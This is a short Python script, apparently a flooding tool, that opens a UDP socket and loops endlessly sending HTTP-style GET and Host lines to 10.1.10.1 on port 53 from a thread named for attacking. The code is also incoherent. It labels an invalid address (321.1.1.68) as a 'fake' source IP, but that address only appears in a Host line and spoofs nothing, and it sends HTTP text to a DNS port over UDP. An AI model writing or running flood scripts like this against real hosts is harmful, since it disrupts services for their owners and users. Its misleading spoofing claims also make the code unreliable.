import socket
import threading

target = '10.1.10.1'
port = 53
fake_ip = '321.1.1.68'

def attack():
    while True:
        sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
attack_thread = threading.Thread(target=attack)
attack_thread.start()